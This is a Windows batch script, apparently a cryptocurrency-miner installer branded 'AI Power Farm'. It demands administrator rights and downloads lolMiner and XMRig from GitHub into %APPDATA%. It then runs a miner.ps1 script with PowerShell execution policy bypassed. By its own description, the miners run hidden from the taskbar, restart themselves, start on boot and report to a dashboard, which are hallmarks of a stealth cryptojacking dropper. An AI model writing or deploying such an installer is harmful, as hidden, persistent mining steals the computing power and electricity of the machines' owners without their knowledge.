@echo off
title AI Power Farm - GPU + CPU Miner Installer
color 0A

echo ============================================
echo    AI POWER FARM - MINER INSTALLER
echo    GPU + CPU Mining Combined
echo ============================================
echo.

echo [1/5] Checking administrator privileges...
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo [ERROR] Run as Administrator!
    echo Right-click this file and select "Run as administrator"
    pause
    exit /b 1
)
echo [OK] Running as administrator
echo.

echo [2/5] Creating installation directory...
mkdir "%APPDATA%\AI-Power-Farm" 2>nul
echo [OK] Directory created
echo.

echo [3/5] Downloading GPU Miner (lolMiner)...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.97a/lolMiner_v1.97a_Win64.zip' -OutFile '%APPDATA%\AI-Power-Farm\lolminer.zip'"
powershell -Command "Expand-Archive -Path '%APPDATA%\AI-Power-Farm\lolminer.zip' -DestinationPath '%APPDATA%\AI-Power-Farm\lolminer' -Force"
echo [OK] GPU Miner downloaded
echo.

echo [4/5] Downloading CPU Miner (XMRig)...
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-msvc2019-win64.zip' -OutFile '%APPDATA%\AI-Power-Farm\xmrig.zip'"
powershell -Command "Expand-Archive -Path '%APPDATA%\AI-Power-Farm\xmrig.zip' -DestinationPath '%APPDATA%\AI-Power-Farm\xmrig' -Force"
echo [OK] CPU Miner downloaded
echo.

echo [5/5] Configuring miners...
powershell -ExecutionPolicy Bypass -File "%~dp0miner.ps1" -Install
echo.

echo ============================================
echo    INSTALLATION COMPLETE!
echo ============================================
echo.
echo GPU Miner: lolMiner (ETC Mining)
echo CPU Miner: XMRig (XMR Mining)
echo.
echo Features:
echo   - Runs hidden (can't be seen in taskbar)
echo   - Auto-restarts if closed
echo   - Starts on boot
echo   - Reports to dashboard
echo.
echo To stop: Run miner.ps1 -Stop
echo To uninstall: Run miner.ps1 -Uninstall
echo.
pause
